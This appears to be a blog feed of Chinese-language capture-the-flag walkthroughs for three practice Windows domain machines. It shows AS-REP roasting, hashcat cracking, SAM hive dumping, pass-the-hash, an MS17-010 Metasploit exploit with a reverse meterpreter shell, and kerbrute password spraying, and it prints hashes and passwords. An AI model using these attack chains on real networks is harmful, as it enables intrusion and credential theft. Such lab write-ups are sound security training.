99ae77c0c0faf78b872f9f452e3eaa24  -

┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# steghide extract -sf big2.jpg
Enter passphrase: 99ae77c0c0faf78b872f9f452e3eaa24
wrote extracted data to "frase.txt".

┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# cat frase.txt
Bigpoppa1972

<br>成功获取到一个字符串 应该是密码<br><br>利用 music : Bigpoppa1972  winrm登录上来<br>
先看权限有没有可以利用的<br>*Evil-WinRM* PS C:\Users\TEMP\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br>没有看到可以直接用的<br><br>收集域内信息<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# netexec ldap 192.168.212.4 -u 'music' -p 'Bigpoppa1972'  --bloodhound --collection All --dns-server 192.168.212.4
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
LDAP        192.168.212.4   389    BIG              [+] bbr.thl\music:Bigpoppa1972
LDAP        192.168.212.4   389    BIG              Resolved collection methods: group, acl, dcom, session, rdp, psremote, container, trusts, objectprops, localadmin
LDAP        192.168.212.4   389    BIG              Done in 00M 00S
LDAP        192.168.212.4   389    BIG              Compressing output into /root/.nxc/logs/BIG_192.168.212.4_2024-12-06_083621_bloodhound.zip


<br>导入进行分析<br>
发现song用户是无预身份验证的账户<br>
存在AS-REP漏洞<br>
<img alt="Pasted image 20241205174333" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205174333.png" referrerpolicy="no-referrer"><br><br>因为song 是无预身份验证的账户 即禁用预认证的用户<br>
禁用预认证的用户会向域控制器发送不包含加密的身份验证请求，因此攻击者可以捕获 AS-REP 响应并进行密码破解。
<br>我们可以进行 AS-REPRoasting 攻击<br>
在攻击之前先同步域时间<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# rdate -n 192.168.212.4
Fri Dec  6 08:47:54 CST 2024

<br>捕获 AS-REP 响应<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# impacket-GetNPUsers bbr.thl/song:123
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Cannot authenticate song, getting its TGT
$krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729cd8e104cf$ce7dbe4474a7db21b21809a7af5f3416786079bc76f6f780dbea54769b28b03d04ca645a378eeddce0bee8615211f36cfeba66c4bf4c3b7c4adcc74b474482a977105c2d8571ff3b2393b5a61e1292c8ffa7b801ce0d76f1ae4d540ccabd7430f1f67175812a94ca527b707fc07644e6f22d2cba60f0f6e280b4f0f7dc28817df23202d8b9b81ca5d9a0ad02dcbed0a7d87b797236a902051c44a83ebe97f603b741754f36b1cbed5d9dd71d3cd82017db227d6a8004af1bf4007877cdcc2e7af7c83e60304973c0dcb5fbb98cebbe59334307b935065b1a4abbba83b5bb82cdb409
<br>hashcat 破解发现用rockyou爆破不出来<br>
可能是信息收集不够。 我们直接去看一下网站目录下有什么东西<br>*Evil-WinRM* PS C:\inetpub\wwwroot\songs&gt; dir


    Directory: C:\inetpub\wwwroot\songs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/2/2024   4:54 AM           3535 BigPoppa.txt
-a----         5/2/2024   4:54 AM           4280 Hypnotize.txt
-a----         5/2/2024   4:54 AM           3350 Juicy.txt
-a----         5/2/2024   4:54 AM           1793 Skyisthelimit.txt
-a----         5/3/2024   2:06 PM            168 web.config

<br>可以发现网站 songs 目录下我们少拿了很多文件<br>都下下来看看<br>
发现 Skyisthelimit.txt 里面是一个密码字典<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# cat Skyisthelimit.txt
123456
admin
12345678
123456789
1234
12345
password
123
Aa123456
1234567890
UNKNOWN
1234567
...

<br>利用这个字典进行爆破<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# hashcat -a 0 -m 18200 as-rep.txt Skyisthelimit.txt
hashcat (v6.2.6) starting


$krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729cd8e104cf$ce7dbe4474a7db21b21809a7af5f3416786079bc76f6f780dbea54769b28b03d04ca645a378eeddce0bee8615211f36cfeba66c4bf4c3b7c4adcc74b474482a977105c2d8571ff3b2393b5a61e1292c8ffa7b801ce0d76f1ae4d540ccabd7430f1f67175812a94ca527b707fc07644e6f22d2cba60f0f6e280b4f0f7dc28817df23202d8b9b81ca5d9a0ad02dcbed0a7d87b797236a902051c44a83ebe97f603b741754f36b1cbed5d9dd71d3cd82017db227d6a8004af1bf4007877cdcc2e7af7c83e60304973c0dcb5fbb98cebbe59334307b935065b1a4abbba83b5bb82cdb409:Passwordsave@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$song@BBR.THL:7778a3e5b83d24074528729c...cdb409
Time.Started.....: Fri Dec  6 11:30:12 2024 (0 secs)
Time.Estimated...: Fri Dec  6 11:30:12 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Skyisthelimit.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   429.8 kH/s (0.07ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 201/201 (100.00%)
Rejected.........: 0/201 (0.00%)
Restore.Point....: 0/201 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -&gt; qwerty123456
Hardware.Mon.#1..: Util: 13%

<br>成功得到 song 用户的密码 Passwordsave@<br><br>利用账户密码登录上去 看一下 song 用户的权限<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

<br>发现存在 SeBackupPrivilege (备份文件和目录) 权限<br>
那么可以进行SAM转储<br>在 song 用户的winrm客户端下<br>
找一个可以下载的目录<br>
转储sam 与系统注册表<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; reg save hklm\sam sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; reg save hklm\system system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; dir


    Directory: C:\Users\TEMP.bbr\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        12/5/2024   9:05 PM          36864 sam.hive
-a----        12/5/2024   9:05 PM        9945088 system.hive

<br>然后下载到kali<br>*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; download sam.hive

Info: Downloading C:\Users\TEMP.bbr\Documents\sam.hive to sam.hive

Info: Download successful!
*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents&gt; download system.hive

Info: Downloading C:\Users\TEMP.bbr\Documents\system.hive to system.hive

Info: Download successful!

<br>使用 impacket-secretsdump 从注册表转储文件中获取 ntlm 哈希<br>┌──(root㉿kali)-[/home/kali/thl/BIG]
└─# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xbb33617256ea48219d9d3d01766b7a9e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb1c50a48c37e053d2045cd5b55cd2f2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...


<br>获取到管理员的哈希，PTH传递 登录上去<br>evil-winrm -i 192.168.212.4 -u administrator -H 5d48bcf84aea999fb1ade06970a81237

*Evil-WinRM* PS C:\users\music\documents&gt; type user.txt
53bdf70c03ad626fe7a17ba5a9495b3a

*Evil-WinRM* PS C:\Users\Administrator\documents&gt; type root.txt
8e824f6e933f0b62616aa54d75416184

<br>
这里有点问题。 我们获取到的hash是bb1c50a48c37e053d2045cd5b55cd2f2<br>
但是等不上去。 正确的hash是5d48bcf84aea999fb1ade06970a81237
<br>看了一下wp。<br>
5d48bcf84aea999fb1ade06970a81237 的来源是看的这个 <a data-tooltip-position="top" aria-label="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" rel="noopener nofollow" class="external-link" href="http://www.vxer.cn/2024/11/12/thehackerslabs-big-walkthrough/?unapproved=93&amp;moderation-hash=b2958a09da2185b9e9173703b0165341#comment-93" target="_blank">wp</a> <br>而且官方下面的 <a data-tooltip-position="top" aria-label="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" rel="noopener nofollow" class="external-link" href="https://curiosidadesdehackers.com/resolucion-de-la-maquina-b-i-g/" target="_blank">wp</a> 用的又是 bb1c50a48c37e053d2045cd5b55cd2f2 登上去的<br>我猜测可能是用户改变导致的<br>
<img alt="Pasted image 20241205212440" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205212440.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/thl/4.big.html</link><guid isPermaLink="false">24-渗透/THL/4.BIG.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/big1.jpg"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Doraemon]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. MS17-010" data-href="#3. MS17-010" href="https://www.c1trus.top/about:blank#3._MS17-010" class="internal-link" target="_self" rel="noopener nofollow">3. MS17-010</a><br>
靶机链接  <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/doraemon/" target="_blank">https://thehackerslabs.com/doraemon/</a><br>
难度 ⭐️️
<br><br>┌──(root㉿kali)-[/home/kali/thl/doraemon]
└─#  fscan -h 192.168.10.5

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.10.5:139 open
192.168.10.5:445 open
192.168.10.5:135 open
192.168.10.5:88 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.10.5
   [-&gt;]WIN-VRU3GG3DPLJ
   [-&gt;]192.168.10.5
[+] MS17-010 192.168.10.5       (Windows Server 2016 Datacenter 14393)
[*] NetBios 192.168.10.5    [+] DC:WIN-VRU3GG3DPLJ.DORAEMON.THL      ▒Windows Server 2016 Datacenter 14393
已完成 4/4
[*] 扫描结束,耗时: 1.017942284s

<br>域名 DORAEMON.THL<br>
DC  WIN-VRU3GG3DPLJ.DORAEMON.THL<br>先配hosts<br><br>发现有ms17-010<br>
看看能不能用、直接梭哈<br>msfconsole
use exploit/windows/smb/ms17_010_psexec
set rhosts 192.168.10.5
set lhost 192.168.10.3
run

msf6 exploit(windows/smb/ms17_010_psexec) &gt; run

[*] Started reverse TCP handler on 192.168.10.3:4444
[*] 192.168.10.5:445 - Target OS: Windows Server 2016 Datacenter 14393
[*] 192.168.10.5:445 - Built a write-what-where primitive...
[+] 192.168.10.5:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.10.5:445 - Selecting PowerShell target
[*] 192.168.10.5:445 - Executing the payload...
[+] 192.168.10.5:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 192.168.10.5
[*] Meterpreter session 1 opened (192.168.10.3:4444 -&gt; 192.168.10.5:49724) at 2024-12-05 15:23:39 +0800

meterpreter &gt; shell
Process 1124 created.
Channel 1 created.
Microsoft Windows [Versi▒n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

<br>这应该是拿下了吧<br>c:\Users\Administrador\Desktop&gt;type root.txt
type root.txt
advcrfbuiwergvb78wer9hg3n4sdfs43

c:\Users&gt;type Suneo\desktop\user.txt
type Suneo\desktop\user.txt
asfre6vcergv3bvfsiregvrtetgb9rnwn543

]]></description><link>https://www.c1trus.top/24-渗透/thl/3.doraemon.html</link><guid isPermaLink="false">24-渗透/THL/3.Doraemon.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[2.Pacharan]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. smb空会话检测" data-href="#3. smb空会话检测" href="https://www.c1trus.top/about:blank#3._smb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">3. smb空会话检测</a>
<br><a data-tooltip-position="top" aria-label="4. Kerbrute force" data-href="#4. Kerbrute force" href="https://www.c1trus.top/about:blank#4._Kerbrute_force" class="internal-link" target="_self" rel="noopener nofollow">4. Kerbrute force</a>
<br><a data-tooltip-position="top" aria-label="5. 密码喷涂" data-href="#5. 密码喷涂" href="https://www.c1trus.top/about:blank#5._密码喷涂" class="internal-link" target="_self" rel="noopener nofollow">5. 密码喷涂</a>
<br><a data-tooltip-position="top" aria-label="6. Orujo利用" data-href="#6. Orujo利用" href="https://www.c1trus.top/about:blank#6._Orujo利用" class="internal-link" target="_self" rel="noopener nofollow">6. Orujo利用</a>
<br><a data-tooltip-position="top" aria-label="7. Whisky用户利用" data-href="#7. Whisky用户利用" href="https://www.c1trus.top/about:blank#7._Whisky用户利用" class="internal-link" target="_self" rel="noopener nofollow">7. Whisky用户利用</a>
<br><a data-tooltip-position="top" aria-label="8. CVE-2021-34527 提权到系统用户" data-href="#8. CVE-2021-34527 提权到系统用户" href="https://www.c1trus.top/about:blank#8._CVE-2021-34527_提权到系统用户" class="internal-link" target="_self" rel="noopener nofollow">8. CVE-2021-34527 提权到系统用户</a>
<br><a data-tooltip-position="top" aria-label="9. 方式2： SeLoadDriverPrivilege权限提权到系统" data-href="#9. 方式2： SeLoadDriverPrivilege权限提权到系统" href="https://www.c1trus.top/about:blank#9._方式2：_SeLoadDriverPrivilege权限提权到系统" class="internal-link" target="_self" rel="noopener nofollow">9. 方式2： SeLoadDriverPrivilege权限提权到系统</a><br>
靶机链接<br>
难度 ⭐️⭐️⭐️⭐️️
<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# fscan -h 192.168.69.69

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| ''__/ _ |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.69.69:445 open
192.168.69.69:88 open
192.168.69.69:139 open
192.168.69.69:135 open
[*] alive ports len is: 4
start vulscan
[*] NetBios 192.168.69.69   [+] DC:PACHARAN\WIN-VRU3GG3DPLJ
[*] NetInfo
[*]192.168.69.69
   [-&gt;]WIN-VRU3GG3DPLJ
   [-&gt;]192.168.69.69
已完成 4/4
[*] 扫描结束,耗时: 1.128075052s

┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# nmap -sC -sV 192.168.69.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 14:51 CST
Nmap scan report for 192.168.69.69
Host is up (0.00014s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-04 13:51:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 08:00:27:7A:01:8C (Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m57s
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:7a:01:8c (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-12-04T13:51:20
|_  start_date: 2024-12-04T13:48:49

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds

<br>域名 PACHARAN.THL<br>
配一下hsots<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# smbmap -u anonymous -H 192.168.69.69

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.69.69:445       Name: PACHARAN.THL              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión
        NETLOGON2                                               READ ONLY
        PACHARAN                                                NO ACCESS
        PDF Pro Virtual Printer                                 NO ACCESS       Soy Hacker y arreglo impresoras
        print$                                                  NO ACCESS       Controladores de impresora
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión
        Users                                                   NO ACCESS
<br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# smbclient -U anonymous   //192.168.69.69/NETLOGON2
Password for [WORKGROUP\anonymous]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Aug  1 01:25:34 2024
  ..                                  D        0  Thu Aug  1 01:25:34 2024
  Orujo.txt                           A       22  Thu Aug  1 01:25:55 2024

                7735807 blocks of size 4096. 4713743 blocks available
smb: \&gt; get Orujo.txt
getting file \Orujo.txt of size 22 as Orujo.txt (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
smb: \&gt; exit


┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# cat Orujo.txt
Pericodelospalotes6969   
<br>获取到两个关键字符串<br>
Pericodelospalotes6969<br>
Orujo<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# kerbrute userenum -d PACHARAN.THL --dc 192.168.69.69 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/04/24 - Ronnie Flathers @ropnop

2024/12/04 15:01:42 &gt;  Using KDC(s):
2024/12/04 15:01:42 &gt;   192.168.69.69:88

2024/12/04 15:01:42 &gt;  [+] VALID USERNAME:       chivas@PACHARAN.THL
2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       hendrick@PACHARAN.THL
2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       whisky@PACHARAN.THL
2024/12/04 15:01:44 &gt;  [+] VALID USERNAME:       gordons@PACHARAN.THL
2024/12/04 15:01:46 &gt;  [+] VALID USERNAME:       redlabel@PACHARAN.THL
2024/12/04 15:01:47 &gt;  [+] VALID USERNAME:       beefeater@PACHARAN.THL
2024/12/04 15:01:47 &gt;  [+] VALID USERNAME:       Chivas@PACHARAN.THL
2024/12/04 15:01:49 &gt;  [+] VALID USERNAME:       invitado@PACHARAN.THL
2024/12/04 15:02:06 &gt;  [+] VALID USERNAME:       administrador@PACHARAN.THL
2024/12/04 15:06:35 &gt;  [+] VALID USERNAME:       carlosv@PACHARAN.THL
2024/12/04 15:07:19 &gt;  [+] VALID USERNAME:       Whisky@PACHARAN.THL
2024/12/04 15:07:26 &gt;  [+] VALID USERNAME:       RedLabel@PACHARAN.THL
2024/12/04 15:07:41 &gt;  [+] VALID USERNAME:       GordonS@PACHARAN.THL
2024/12/04 15:07:42 &gt;  [+] VALID USERNAME:       GINEBRA@PACHARAN.THL
2024/12/04 15:07:48 &gt;  [+] VALID USERNAME:       CarlosV@PACHARAN.THL
2024/12/04 15:07:49 &gt;  [+] VALID USERNAME:       CHIVAS@PACHARAN.THL
2024/12/04 15:07:50 &gt;  [+] VALID USERNAME:       Beefeater@PACHARAN.THL
2024/12/04 15:08:03 &gt;  Done! Tested 8295455 usernames (17 valid) in 380.478 seconds

┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# cat kerbrute_users.txt|cut -d ' ' -f14|cut -d '@' -f1&gt;valid_users.txt

┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# cat valid_users.txt
chivas
hendrick
whisky
gordons
redlabel
beefeater
Chivas
invitado
administrador
carlosv
Whisky
RedLabel
GordonS
GINEBRA
CarlosV
CHIVAS
Beefeater

<br>把上面获取到的字符串也加进去 Pericodelospalotes6969 Orujo<br><br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# crackmapexec smb PACHARAN.THL -u valid_users.txt -p valid_users.txt --continue-on-success
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)

SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:chivas
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:hendrick
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:whisky
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:gordons
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:redlabel
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:beefeater
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Chivas
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:invitado
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:administrador
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:carlosv
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Whisky
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:RedLabel
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:GordonS
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:GINEBRA
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:CarlosV
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:CHIVAS
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Beefeater
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Pericodelospalotes6969
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Pericodelospalotes6969:Orujo
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:chivas STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:hendrick STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:whisky STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:gordons STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:redlabel STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:beefeater STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Chivas STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:invitado STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:administrador STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:carlosv STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Whisky STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:RedLabel STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:GordonS STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:GINEBRA STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:CarlosV STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:CHIVAS STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Beefeater STATUS_LOGON_FAILURE
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Orujo:Pericodelospalotes6969
SMB         PACHARAN.THL    445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Orujo STATUS_LOGON_FAILURE


<br>可以看到 Pericodelospalotes6969 用户是不需要密码的<br>
尝试利用 evil-winrm 登录该用户 <br>┌──(root㉿kali)-[/home/kali/thl/Pacharan]
└─# evil-winrm -i 192.168.69.69 -u Pericodelospalotes6969 -p Per

Evil-WinRM shell v3.5

